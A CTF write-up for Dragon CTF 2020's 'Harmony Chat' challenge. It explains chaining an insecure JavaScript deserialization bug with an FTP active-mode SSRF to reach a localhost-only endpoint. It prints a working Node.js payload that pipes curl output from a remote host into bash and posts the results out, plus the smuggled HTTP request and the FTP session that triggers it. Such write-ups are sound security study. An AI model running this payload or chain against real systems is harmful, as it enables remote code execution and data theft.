---
title: "Dragon CTF 2020 - Harmony Chat"
date: 2020-11-26T19:19:49+01:00
draft: false
---

Files:

 - This challenge provided a [link](http://harmony-1.hackable.software:3380/) and source ([harmony.zip](https://storage.googleapis.com/dragonctf-prod/harmony_301f77ba9efff83a832c0a31886c8d4a7aae39de1b9b3126fef5c7d4815b515f/harmony.zip))

## Part 0: research

At first sight, the challenge looks like an IRC-like chat, where you can log in with your name and send messages.

The web app also allowed for downloading logs via HTTP and FTP, which seemed exploit-worthy to us.

Upon inspecting the source code, we found a very obscure, yet common-sounding library called [`javascript-serializer`](https://github.com/wix-incubator/javascript-serializer), which can serialize and deserialize classes and an endpoint for sending CSP report, which was restricted for localhost:
```javascript
const handleReport = (req, res) => {
  let data = Buffer.alloc(0)

  req.on("data", chunk => {
    data = Buffer.concat([data, chunk])
  })

  req.on("end", () => {
    res.status(204).end()

    if (!isLocal(req)) {
      return
    }

    try {
      const report = utils.validateAndDecodeJSON(data, REPORT_SCHEMA)
      console.error(generateTextReport(report["csp-report"]))
    } catch (error) {
      console.warn(error)
      return
    }
  })
}
```

Considering that the `validateAndDecodeJSON` function returns data parsed by the library mentioned above, we realized it could lead to a simple RCE exploit, as you could just pass a "serialized" `Function` class with function body.

## Part 1: crafting an exploit

It turned out that in newer versions, the `Function()` constructor in Node.js is somehow sandboxed, without most things like `require`. One of the ways of getting around it is using weird internal functions, in our case it was `process.binding('spawn_sync')` to spawn a process.
Here's the exploit we ended up using:
```javascript
process.binding('spawn_sync').spawn({
	file: '/bin/bash',
	args: [
		'/bin/bash', '-c', 'curl -d \"$(curl https://%REDACTED% | bash)\" https://%REDACTED%/'
	],
	stdio: [
		{type:'pipe',readable:!0,writable:!1},
		{type:'pipe',readable:!1,writable:!0},
		{type:'pipe',readable:!1,writable:!0}
	]});
```
In short, the exploit connects to some server, executes code from it and sends output via POST to another server.

After minifying the code and putting it into JSON, we started to search for a property we could exploit. As most of the properties were defined in the schema to be strings, it wouldn't be possible to put the object into them. Hopefully, there have been some optional properties which were not defined in the schema, but were evaluated in the code. We decided to use `script-sample`, because it was one of the optional properties and wasn't handled in any special way, just printed.
```javascript
const generateTextReport = report => {
  ...

  if (report["script-sample"]) {
    text += `Sample      : ${report["script-sample"]}\n`
  }

  ...
}
```


## Part 2: SSRF

In the meantime, we started to look for a SSRF exploit, because the CSP report endpoint was being limited only to localhost. We realized that because of the FTP server, we could craft such "chat log" that would be a valid HTTP request, then send that file via FTP active mode to `127.0.0.1:3380`.
Fortunately, the only limitations were:
- the line must have `: ` after 0-30 characters (length of the username)
- the line must be less than 2080 characters long (30 for the username, 2 for the `: ` and 2048 for the content)

The HTTP request we came up with:
```
POST /csp-report?: HTTP/1.1
Host: 127.0.0.1
Content-Length: 527
Content-Type: application/csp-report

{"csp-report":{"blocked-uri":""(...)
```

Note the `?:` part in the path - it's needed because of the first limitation.

Having that, we've created a [script](https://github.com/p4-team/ctf/blob/master/2020-11-20-dragonctf/harmony_chat/send.py) for crafting the file on the server, which basically creates new users and joins the same channel, then prints the link to the chat log it created.

## Part 3: actual exploiting

After all that, triggering the actual exploit was as simple as this:
(`13,52` = `(13*256)+52` = `3380`)
```
$ nc harmony-1.hackable.software 3321
220 FTP server (nodeftpd) ready
USER f24090d4641cb9b776c2bd5b05446c9d
331 User name okay, need password.
PASS x
230 User logged in, proceed.
PORT 127,0,0,1,13,52
200 OK
RETR 848800924e2316585788974dc12dbbcf
150 Opening ASCII mode data connection
226 Closing data connection, sent 636 bytes
```
